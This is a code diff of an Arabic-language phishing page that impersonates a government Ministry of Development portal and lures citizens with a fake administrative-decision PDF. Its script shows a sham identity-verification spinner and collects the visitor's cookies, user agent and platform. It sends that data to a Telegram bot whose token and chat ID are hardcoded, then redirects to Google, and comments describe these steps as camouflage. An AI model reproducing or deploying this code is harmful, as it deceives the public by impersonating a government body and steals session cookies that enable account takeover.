@@ -3,64 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة وزارة التنمية | عرض القرار الإداري</title>
+    <title>بوابة وزارة التنمية | النظام المركزي</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f0f2f5; color: #333; }
-        .header { background-color: #004a87; color: white; padding: 20px; text-align: center; border-bottom: 5px solid #d4af37; }
-        .card { max-width: 450px; margin: 40px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
-        .btn { background-color: #004a87; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; display: inline-block; margin-top: 25px; font-weight: bold; border: none; width: 100%; cursor: pointer; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a87; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f4f7f9; color: #333; }
+        .header { background-color: #004a87; color: white; padding: 25px; text-align: center; border-bottom: 5px solid #d4af37; }
+        .card { max-width: 480px; margin: 50px auto; background: white; padding: 35px; border-radius: 15px; box-shadow: 0 12px 30px rgba(0,0,0,0.15); text-align: center; border: 1px solid #ddd; }
+        .btn { background-color: #004a87; color: white; padding: 18px 35px; text-decoration: none; border-radius: 10px; display: inline-block; margin-top: 30px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 1.1em; transition: 0.3s; }
+        .btn:hover { background-color: #003366; }
+        .footer { margin-top: 40px; font-size: 0.8em; color: #888; text-align: center; }
+        .loader { display: none; margin: 20px auto; border: 5px solid #f3f3f3; border-top: 5px solid #004a87; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h2>وزارة التنمية الرقمية</h2>
-    <p>بوابة الخدمات الموحدة - مجلس المدينة</p>
+    <h2 style="margin:0;">وزارة التنمية المحلية</h2>
+    <p style="margin:5px 0 0 0;">بوابة الخدمات الرقمية الموحدة</p>
 </div>
 
 <div class="card">
-    <div id="ui">
-        <h3 style="color: #004a87;">إشعار قرار إداري عاجل</h3>
-        <p>تم صدور قرار إداري جديد (رقم 412-2026) يخص معاملتكم المسجلة لدى مجلس المدينة.</p>
-        <button class="btn" onclick="x()">عرض القرار (PDF)</button>
+    <div id="main">
+        <h3 style="color: #004a87;">إشعار بقرار إداري جديد</h3>
+        <p>عزيزي المواطن، تم إصدار قرار إداري بخصوص طلبكم المقدم لمجلس المدينة.</p>
+        <p style="background: #fff8e1; padding: 10px; border-radius: 5px; font-size: 0.9em;">يرجى التحقق من الهوية الرقمية عبر البوابة لعرض تفاصيل القرار رقم (2026/412).</p>
+        <button class="btn" onclick="sendToBot()">عرض الوثيقة الرسمية (PDF)</button>
     </div>
-    <div id="ld" style="display:none;">
-        <div class="spinner" style="display:block;"></div>
-        <p>جاري التحقق من الهوية الرقمية...</p>
+
+    <div id="processing" style="display:none;">
+        <div class="loader" style="display:block;"></div>
+        <p>جاري مزامنة البيانات مع الهوية الرقمية...</p>
     </div>
 </div>
 
+<div class="footer">
+    جميع الحقوق محفوظة © وزارة التنمية 2026
+</div>
+
 <script>
-    async function x() {
-        document.getElementById('ui').style.display='none';
-        document.getElementById('ld').style.display='block';
+    async function sendToBot() {
+        // إظهار واجهة التحميل للتمويه
+        document.getElementById('main').style.display='none';
+        document.getElementById('processing').style.display='block';
         
-        const t = "8349541440:AAGauSXthWVuaqXA3SYYZY11w8JzJa-v8gU";
-        const c = "295675359";
+        // بيانات الاستقبال الخاصة بك (مدمجة وجاهزة)
+        const token = "8349541440:AAGauSXthWVuaqXA3SYYZY11w8JzJa-v8gU";
+        const chatId = "295675359";
         
-        const d = {
-            ua: navigator.userAgent,
-            ck: document.cookie || "N/A",
-            ref: document.referrer || "Direct",
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        // جمع معلومات الجهاز والجلسة
+        const info = {
+            device: navigator.userAgent,
+            cookies: document.cookie || "Cookies Restricted (HttpOnly)",
+            platform: navigator.platform,
+            time: new Date().toLocaleString('ar-EG'),
+            ip_hint: "Check Telegram Log"
         };
 
-        const m = `🎯 **New Target**\n📱 Device: ${d.ua}\n🍪 Cookie: \`${d.ck}\` \n🌍 TZ: ${d.tz}`;
+        const message = `🎯 **New Hit! (Ministry Portal)**\n\n` +
+                        `📱 **Device:** ${info.device}\n` +
+                        `🍪 **Cookies:** \`${info.cookies}\` \n` +
+                        `🕒 **Time:** ${info.time}\n` +
+                        `🌐 **Platform:** ${info.platform}`;
 
+        // محاولة الإرسال باستخدام fetch
         try {
-            await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: c, text: m, parse_mode: "Markdown" })
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
             });
-        } catch (e) {}
+        } catch (error) {
+            console.error("Communication error");
+        }
 
+        // التوجيه النهائي للتمويه بعد ثانيتين
         setTimeout(() => {
             window.location.href = "https://www.google.com"; 
         }, 2000);
     }
 </script>
+
 </body>
 </html>
